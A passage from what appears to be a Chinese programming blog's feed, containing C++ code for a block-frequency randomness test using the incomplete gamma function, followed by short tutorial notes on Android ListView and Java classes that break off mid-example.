"bd6eb987a90a4ea3a6adb3e0cd7cc56511d4283ddd1946248f1c977af1752a503d7ab71a299044e3a07cff234dc9b277eb4d934d9d7a4d33b16960a0f8ab74f5995a1cff90eb490e8404ac452b34cb71d19458390662464f8c6e573fc61569074004829f993f41d59b540036fecff1b16b125b4d356241279963cfeec17ea600bb31d374b09c4ff39261f3bfa1be60377b46c483fa114fa8bb80a23192fb5fcb6c4f823e76994e2b95453bf13efca3dd1cf281c5165e4b62ab9ecba835665908938449119ea04c6aa9eca8d71902c8909084401fb78c4298a02fd81934305fe7aede9af4fdd34306abe2d9499e7021016ac7beff194a4f7893e0665c1aedb3138483f5f4b59d49efb797a2ed37cc748575bc658e7c75440e8974128389ede6013b3afa191a1d43ab80fc0701fce1d7e44345ecc29f444b91b0d01feeec8144507fe8ea62d1c849cdb42bbfa537d941e5b843cb603eab4d6c956524dcf986d077c783274553fe4bf69aae64bd1353b20d21103f60c00d49529f14b6846535cf08a8e2446223af47adbe41b75509b3f1272db4e67f8b6e48e19f5594d940b3ab4a6ee8163252994ad7b679081fe52d21250f49a11529a44dab92cd1e9eac22db805be622a96afa4cc5b7d2ad7a1f4b3db211579531544349d0b9d36e0b3c313ba6d592cf6b3e2e4444b3aa3c5a4e2705a098977898249247139aaa32fe7f381932";  //声明待测数据</span>    string str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入待测数据："</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cin <span class="token operator">>></span> str<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//分块</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//待测二元序列的长度</span>    <span class="token keyword">int</span> M<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//每块的长度</span>    n <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"请输入每块的长度："</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> M<span class="token punctuation">;</span>    <span class="token keyword">int</span> N <span class="token operator">=</span> n <span class="token operator">/</span> M<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//几块 </span>    string<span class="token operator">*</span> duan <span class="token operator">=</span> <span class="token keyword">new</span> string<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        duan<span class="token punctuation">[</span>count<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> M <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            count<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//舍去</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> N<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//计算每个块中“1”的比例</span>    <span class="token keyword">double</span><span class="token operator">*</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> M<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">convertAndCount</span><span class="token punctuation">(</span><span class="token function">convertToDec</span><span class="token punctuation">(</span>duan<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>M<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"第"</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span><span class="token string">"块------------ "</span><span class="token operator">&lt;&lt;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"==============="</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//计算卡方统计量的观察值</span>    <span class="token keyword">double</span> qiao <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        qiao <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">1.0</span> <span class="token operator">/</span> <span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    qiao <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> M<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"(3)---------"</span> <span class="token operator">&lt;&lt;</span> qiao <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"==============="</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//(4)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">igamc</span><span class="token punctuation">(</span>count <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> qiao <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.001</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"结果：该序列是随机序列"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"结果：该序列是非随机序列"</span><span class="token punctuation">;</span>    <span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> duan<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//字符-->十进制</span><span class="token keyword">int</span> <span class="token function">convertToDec</span><span class="token punctuation">(</span><span class="token keyword">char</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//字符变为数</span>    <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        num <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalpha</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">islower</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            num <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> <span class="token number">15</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> num<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            num <span class="token operator">=</span> <span class="token keyword">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">></span> <span class="token number">15</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> num<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//十进制-->二进制中“1”的个数</span><span class="token keyword">int</span> <span class="token function">convertAndCount</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>num <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> a <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">;</span>            num <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                result <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//   基本思想是用切比雪夫多项式来逼近</span><span class="token keyword">double</span> <span class="token function">gamma1</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//完全伽马函数</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">double</span> y<span class="token punctuation">,</span> t<span class="token punctuation">,</span> s<span class="token punctuation">,</span> u<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">double</span> a<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0.0000677106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0.0003442342</span><span class="token punctuation">,</span>                        <span class="token number">0.0015397681</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0.0024467480</span><span class="token punctuation">,</span><span class="token number">0.0109736958</span><span class="token punctuation">,</span>                        <span class="token operator">-</span><span class="token number">0.0002109075</span><span class="token punctuation">,</span><span class="token number">0.0742379071</span><span class="token punctuation">,</span><span class="token number">0.0815782188</span><span class="token punctuation">,</span>                        <span class="token number">0.4118402518</span><span class="token punctuation">,</span><span class="token number">0.4227843370</span><span class="token punctuation">,</span><span class="token number">1.0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//切比雪夫多项式系数</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> <span class="token number">0.0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"err ** x&lt;=0!\n"</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    y <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;=</span> <span class="token number">1.0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        t <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> <span class="token punctuation">(</span>y <span class="token operator">*</span> <span class="token punctuation">(</span>y <span class="token operator">+</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> y <span class="token operator">=</span> y <span class="token operator">+</span> <span class="token number">2.0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;=</span> <span class="token number">2.0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        t <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> y<span class="token punctuation">;</span>  y <span class="token operator">=</span> y <span class="token operator">+</span> <span class="token number">1.0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;=</span> <span class="token number">3.0</span><span class="token punctuation">)</span> t <span class="token operator">=</span> <span class="token number">1.0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        t <span class="token operator">=</span> <span class="token number">1.0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>y <span class="token operator">></span> <span class="token number">3.0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            y <span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">1.0</span><span class="token punctuation">;</span> t <span class="token operator">=</span> t <span class="token operator">*</span> y<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    s <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> u <span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">2.0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> s <span class="token operator">*</span> u <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> s <span class="token operator">*</span> t<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">double</span> <span class="token function">igamc</span><span class="token punctuation">(</span><span class="token keyword">double</span> a<span class="token punctuation">,</span> <span class="token keyword">double</span> x<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不完全伽马函数</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">double</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> d<span class="token punctuation">,</span> s<span class="token punctuation">,</span> s1<span class="token punctuation">;</span>    <span class="token keyword">double</span> p0<span class="token punctuation">,</span> q0<span class="token punctuation">,</span> p1<span class="token punctuation">,</span> q1<span class="token punctuation">,</span> qq<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">&lt;=</span> <span class="token number">0.0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;=</span> <span class="token number">0.0</span><span class="token punctuation">)</span>  cout <span class="token operator">&lt;&lt;</span> <span class="token string">"err ** a&lt;=0!\n"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">0.0</span><span class="token punctuation">)</span>  cout <span class="token operator">&lt;&lt;</span> <span class="token string">"err ** x&lt;=0!\n"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1.0</span> <span class="token operator">==</span> <span class="token number">1.0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">></span> <span class="token number">1.0e+35</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q <span class="token operator">=</span> <span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>  q <span class="token operator">=</span> a <span class="token operator">*</span> q<span class="token punctuation">;</span>  qq <span class="token operator">=</span> <span class="token function">exp</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> <span class="token number">1.0</span> <span class="token operator">+</span> a<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        p <span class="token operator">=</span> a<span class="token punctuation">;</span> d <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> a<span class="token punctuation">;</span> s <span class="token operator">=</span> d<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            p <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">+</span> p<span class="token punctuation">;</span> d <span class="token operator">=</span> d <span class="token operator">*</span> x <span class="token operator">/</span> p<span class="token punctuation">;</span> s <span class="token operator">=</span> s <span class="token operator">+</span> d<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">fabs</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1.0e-07</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                s <span class="token operator">=</span> s <span class="token operator">*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token punctuation">)</span> <span class="token operator">*</span> qq <span class="token operator">/</span> <span class="token function">gamma1</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        s <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">/</span> x<span class="token punctuation">;</span> p0 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span> p1 <span class="token operator">=</span> <span class="token number">1.0</span><span class="token punctuation">;</span> q0 <span class="token operator">=</span> <span class="token number">1.0</span><span class="token punctuation">;</span> q1 <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            p0 <span class="token operator">=</span> p1 <span class="token operator">+</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> p0<span class="token punctuation">;</span> q0 <span class="token operator">=</span> q1 <span class="token operator">+</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> q0<span class="token punctuation">;</span>            p <span class="token operator">=</span> x <span class="token operator">*</span> p0 <span class="token operator">+</span> n <span class="token operator">*</span> p1<span class="token punctuation">;</span> q <span class="token operator">=</span> x <span class="token operator">*</span> q0 <span class="token operator">+</span> n <span class="token operator">*</span> q1<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1.0</span> <span class="token operator">!=</span> <span class="token number">1.0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                s1 <span class="token operator">=</span> p <span class="token operator">/</span> q<span class="token punctuation">;</span> p1 <span class="token operator">=</span> p<span class="token punctuation">;</span> q1 <span class="token operator">=</span> q<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s1 <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">/</span> s1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1.0e-07</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    s <span class="token operator">=</span> s1 <span class="token operator">*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token punctuation">)</span> <span class="token operator">*</span> qq <span class="token operator">/</span> <span class="token function">gamma1</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">1.0</span> <span class="token operator">-</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                s <span class="token operator">=</span> s1<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            p1 <span class="token operator">=</span> p<span class="token punctuation">;</span> q1 <span class="token operator">=</span> q<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"a too large !\n"</span><span class="token punctuation">;</span>    s <span class="token operator">=</span> <span class="token number">1.0</span> <span class="token operator">-</span> s <span class="token operator">*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token punctuation">)</span> <span class="token operator">*</span> qq <span class="token operator">/</span> <span class="token function">gamma1</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>本算法采用VS2019完成，在其他平台可能会报错，有问题可以联系我</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高级组件</title>
      <link href="/2020/03/23/gao-ji-zu-jian/"/>
      <url>/2020/03/23/gao-ji-zu-jian/</url>
      
        <content type="html"><![CDATA[<h3 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h3><blockquote><p>允许用户通过手指上下滑动将屏幕外的数据滚动到屏幕内，同时原有数据滚动出屏幕。<br>    - 用于垂直显示，如果显示内容过多，则会自动出现垂直滚动条<br>    - 能通过适配器将数据和显示空间绑定，在有限的屏幕上提供大量内容供用户选择<br>    - 支持单击事件，可以用少量的代码实现复杂的选择功能</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java对象和类</title>
      <link href="/2020/03/19/java-dui-xiang-he-lei/"/>
      <url>/2020/03/19/java-dui-xiang-he-lei/</url>
      
        <content type="html"><![CDATA[<h3 id="为对象定义类"><a href="#为对象定义类" class="headerlink" title="为对象定义类"></a>为对象定义类</h3><ul><li>类为对象定义属性和行为</li><li>一个对象的状态由具有当前值的数据域来表示</li><li>对象的行为由方法完成</li><li>一个对象是类的一个实例</li></ul><h3 id="定义类和创建对象"><a href="#定义类和创建对象" class="headerlink" title="定义类和创建对象"></a>定义类和创建对象</h3><blockquote><p>类是对象的定义，对象是从类创建<br>创建类的语法</p></blockquote><ul><li><p>public / privte</p></li><li><p>class</p></li><li><p>类名</p></li><li><p>示例</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//public表示公共类，都可以访问</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TV</span> <span class="token punctuation">{</span><span class="token keyword">int</span> channel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//定义数据域</span><span class="token keyword">int</span> volumeLevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义数据域</span><span class="token keyword">boolean</span> on <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//定义数据域</span><span class="token comment" spellcheck="true">//无参构造函数，用于创建对象</span><span class="token keyword">public</span> <span class="token function">TV</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//开机方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   on <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//关机方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnOff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   on <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//设置频道方法</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setChannel</span><span class="token punctuation">(</span><span class="token keyword">int</span> newChannel<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>on <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token operator">&amp;&amp;</span> newChannel <span class="token operator">>=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> newChannel <span class="token operator">&lt;=</span> <span class="token number">120</span><span class="token punctuation">)</span>       channel <span class="token 